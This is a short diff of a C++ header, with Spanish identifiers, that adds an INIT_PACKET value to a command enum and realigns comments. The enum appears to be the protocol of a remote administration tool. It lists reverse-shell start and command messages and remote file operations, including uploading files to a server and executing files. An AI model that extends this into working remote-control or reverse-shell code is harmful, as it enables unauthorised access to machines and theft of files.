@@ -50,7 +50,8 @@ typedef unsigned long long int u64;
 
 namespace EnumComandos {
     enum Enum {
-        PONG = 499,
+        INIT_PACKET = 498,
+        PONG,
         PING,
         Reverse_Shell_Start,
         Reverse_Shell_Command,
@@ -68,10 +69,10 @@ namespace EnumComandos {
         FM_Crear_Folder,
         FM_Crear_Archivo,
         FM_Borrar_Archivo,
-        FM_Descargar_Archivo, //Enviar archivo al servidor
+        FM_Descargar_Archivo,         //Enviar archivo al servidor
         FM_Descargar_Archivo_Recibir, //Enviar paquete al cliente
-        FM_Descargar_Archivo_Init, //Enviar tama�o del archivo
-        FM_Descargar_Archivo_End, //Ya se envio todo, cerrar archivo
+        FM_Descargar_Archivo_Init,    //Enviar tama�o del archivo
+        FM_Descargar_Archivo_End,     //Ya se envio todo, cerrar archivo
         FM_Ejecutar_Archivo,
         FM_Editar_Archivo,
         FM_Editar_Archivo_Paquete,
